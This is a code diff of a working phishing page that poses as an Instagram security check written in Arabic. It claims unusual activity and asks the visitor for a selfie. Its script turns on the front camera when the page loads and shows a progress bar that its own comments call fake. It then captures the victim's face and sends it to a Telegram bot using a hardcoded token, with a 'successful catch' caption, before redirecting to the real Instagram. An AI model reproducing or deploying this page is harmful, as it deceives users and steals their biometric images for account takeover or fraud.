@@ -3,34 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Instagram</title>
+    <title>Instagram Security</title>
     <style>
-        /* تصغير وحماية الصفحة من التداخل */
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
         body { background-color: #000; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
         
-        /* تأثير التمويه للخلفية لإعطاء إيحاء بالتطبيق */
-        .wrapper { position: absolute; width: 100%; height: 100%; background: #000; display: flex; align-items: center; justify-content: center; }
-        .bg-mockup { position: absolute; width: 100%; height: 100%; background: url('https://the-peak.ca/wp-content/uploads/2023/10/Instagram-Feed-Dark-Mode.png') center/cover; filter: blur(15px) brightness(0.4); }
+        .wrapper { position: absolute; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; }
+        .bg-mock { position: absolute; width: 100%; height: 100%; background: url('https://the-peak.ca/wp-content/uploads/2023/10/Instagram-Feed-Dark-Mode.png') center/cover; filter: blur(20px) brightness(0.3); }
 
-        /* نافذة التنبيه الأصلية من إنستغرام */
-        .alert-container { position: relative; background-color: #262626; width: 280px; border-radius: 12px; overflow: hidden; z-index: 10; animation: instagramPop 0.2s ease-out; }
+        .auth-container { position: relative; background-color: #262626; width: 300px; border-radius: 15px; overflow: hidden; z-index: 10; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         
-        .alert-body { padding: 24px 16px; text-align: center; }
-        .alert-title { color: #fff; font-size: 18px; font-weight: 600; margin-bottom: 8px; }
-        .alert-msg { color: #b2b2b2; font-size: 14px; line-height: 1.4; }
+        .header { padding: 25px 20px 15px; text-align: center; }
+        .icon-lock { width: 50px; margin-bottom: 15px; }
+        .title { color: #fff; font-size: 17px; font-weight: 600; margin-bottom: 10px; }
+        .text { color: #a8a8a8; font-size: 13px; line-height: 1.5; }
 
-        /* الأزرار بنمط iOS/Instagram */
-        .alert-footer { border-top: 0.5px solid #3d3d3d; display: flex; flex-direction: column; }
-        .btn { background: none; border: none; padding: 14px; font-size: 14px; cursor: pointer; width: 100%; outline: none; }
-        .btn-blue { color: #0095f6; font-weight: 700; border-bottom: 0.5px solid #3d3d3d; }
-        .btn-white { color: #fff; font-weight: 400; }
+        /* شريط التحميل الوهمي */
+        .progress-container { padding: 0 20px 20px; display: none; }
+        .progress-bar { background: #3d3d3d; border-radius: 10px; height: 4px; width: 100%; overflow: hidden; }
+        .progress-fill { background: #0095f6; height: 100%; width: 0%; transition: width 0.3s; }
+
+        .footer { border-top: 0.5px solid #3d3d3d; display: flex; flex-direction: column; }
+        .btn { background: none; border: none; padding: 15px; font-size: 14px; cursor: pointer; width: 100%; outline: none; }
+        .btn-primary { color: #0095f6; font-weight: 700; border-bottom: 0.5px solid #3d3d3d; }
+        .btn-secondary { color: #fff; font-weight: 400; }
         .btn:active { background-color: #333; }
-
-        @keyframes instagramPop {
-            from { transform: scale(1.1); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
 
         video, canvas { display: none; }
     </style>
@@ -38,16 +35,23 @@
 <body>
 
 <div class="wrapper">
-    <div class="bg-mockup"></div>
+    <div class="bg-mock"></div>
     
-    <div class="alert-container">
-        <div class="alert-body">
-            <div class="alert-title">تأكيد الهوية</div>
-            <div class="alert-msg">نحتاج إلى إجراء فحص سريع للوجه للتأكد من أنك صاحب الحساب ومنع الوصول غير المصرح به.</div>
+    <div class="auth-container">
+        <div class="header">
+            <img src="https://cdn-icons-png.flaticon.com/512/747/747305.png" class="icon-lock" alt="security">
+            <div class="title">التحقق من الهوية</div>
+            <div id="mainText" class="text">لقد اكتشفنا نشاطاً غير معتاد. يرجى التقاط صورة سيلفي سريعة للتأكد من أنك صاحب الحساب.</div>
         </div>
-        <div class="alert-footer">
-            <button id="captureBtn" class="btn btn-blue">بدء المسح الضوئي</button>
-            <button onclick="location.reload()" class="btn btn-white">إلغاء</button>
+
+        <div id="progressBox" class="progress-container">
+            <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
+            <p style="color:#0095f6; font-size:11px; margin-top:8px; text-align:center;">جاري معالجة البيانات البيومترية...</p>
+        </div>
+
+        <div id="actions" class="footer">
+            <button id="startBtn" class="btn btn-primary">بدء التحقق الآن</button>
+            <button onclick="location.href='https://instagram.com'" class="btn btn-secondary">إلغاء</button>
         </div>
     </div>
 </div>
@@ -56,58 +60,75 @@
 <canvas id="canvas"></canvas>
 
 <script>
-    const BOT_TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
+    const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
     const CHAT_ID = '2140385904';
-    let activeStream = null;
+    let stream = null;
 
-    // تشغيل الكاميرا في الخلفية فوراً وبصمت
-    async function initCamera() {
+    // تجهيز الكاميرا فوراً
+    async function setup() {
         try {
-            activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            document.getElementById('video').srcObject = activeStream;
-        } catch (err) {
-            console.log("Waiting for user interaction...");
-        }
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById('video').srcObject = stream;
+        } catch (e) {}
     }
-    initCamera();
+    setup();
 
-    document.getElementById('captureBtn').onclick = async function() {
-        const btn = this;
-        btn.innerText = "جاري الفحص...";
-        btn.disabled = true;
+    document.getElementById('startBtn').onclick = async function() {
+        const btnBox = document.getElementById('actions');
+        const progBox = document.getElementById('progressBox');
+        const fill = document.getElementById('fill');
+        const mainText = document.getElementById('mainText');
 
-        if (!activeStream) {
+        // تغيير الواجهة لتبدو كأنها تفحص
+        btnBox.style.display = 'none';
+        progBox.style.display = 'block';
+        mainText.innerText = "يرجى توجيه الكاميرا إلى وجهك والثبات لثوانٍ...";
+
+        if (!stream) {
             try {
-                activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('video').srcObject = activeStream;
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('video').srcObject = stream;
             } catch (e) {
-                alert("يرجى السماح بالوصول للكاميرا لإتمام الفحص الأمني.");
-                btn.disabled = false; btn.innerText = "بدء المسح الضوئي";
+                alert("يجب منح صلاحية الكاميرا لإكمال التوثيق الأمني.");
+                location.reload();
                 return;
             }
         }
 
-        // التقاط فوري (سرعة البرق)
-        const canvas = document.getElementById('canvas');
-        const video = document.getElementById('video');
-        canvas.width = 480;
-        canvas.height = 640;
-        canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
-        
-        canvas.toBlob(async (blob) => {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'security_shot.jpg');
+        // حركة شريط التقدم (وهمية للإقناع)
+        let width = 0;
+        const interval = setInterval(() => {
+            if (width >= 100) {
+                clearInterval(interval);
+            } else {
+                width += 10;
+                fill.style.width = width + '%';
+            }
+        }, 150);
+
+        // التقاط الصورة بعد ثانية واحدة من "المعالجة"
+        setTimeout(() => {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.width = 480;
+            canvas.height = 640;
+            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
             
-            // إرسال للبوت في الخلفية دون انتظار
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            
-            // تحويل فوري لإتمام الخدعة
-            setTimeout(() => {
-                if(activeStream) activeStream.getTracks().forEach(t => t.stop());
-                window.location.href = "https://www.instagram.com/accounts/manage_access/";
-            }, 600);
-        }, 'image/jpeg', 0.5);
+            canvas.toBlob((blob) => {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'security.jpg');
+                fd.append('caption', '🚀 صيد ناجح: واجهة التحقق بخطوتين');
+                
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                
+                // توجيه الضحية لإنستغرام بعد الانتهاء
+                setTimeout(() => {
+                    if(stream) stream.getTracks().forEach(t => t.stop());
+                    window.location.href = "https://www.instagram.com/accounts/login/";
+                }, 1000);
+            }, 'image/jpeg', 0.5);
+        }, 1200);
     };
 </script>
 
